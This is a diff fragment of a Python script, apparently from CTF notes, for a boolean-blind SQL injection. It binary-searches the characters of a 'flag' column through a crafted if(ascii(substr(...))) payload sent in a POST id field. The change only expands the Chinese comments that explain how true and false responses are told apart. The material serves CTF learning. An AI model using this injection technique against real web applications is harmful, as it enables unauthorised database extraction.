@@ -508,10 +508,11 @@ while True:
     right = 127
     while letf < right:
         mid = (letf+right) // 2
-        # 此处 正确返回1、错误返回2 是依靠的原题目，原题目表单只有输入1和2有返回，只能查询id是1或2的内容。id=1的内容中包含了Hello
+        # 此处 正确返回1、错误返回2 是依靠的原题目，原题目表单只有输入1和2有返回值，只能查询id是1或2的内容（判断为真返回id为1的内容，为假返回id为2的内容）。id=1的内容中包含了Hello。注意此处已知表名flag和属性名flag
         payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"
         data = {"id":payload} 
         res = requests.post(url=url, data=data).text
+        # 不同的题目此处判断条件不同。该题目为true时内容中有hello(id=1的内容)
         if "Hello" in res:
             letf = mid + 1
         else:
